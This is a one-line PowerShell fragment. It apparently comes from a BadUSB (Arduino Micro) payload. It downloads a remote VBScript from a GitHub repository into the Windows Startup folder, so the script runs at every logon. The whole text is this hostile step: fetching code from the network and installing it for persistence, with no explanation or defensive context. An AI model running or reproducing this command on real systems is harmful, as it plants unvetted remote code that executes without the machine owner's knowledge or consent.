...
Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.vbs -OutFile "$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\run.vbs"
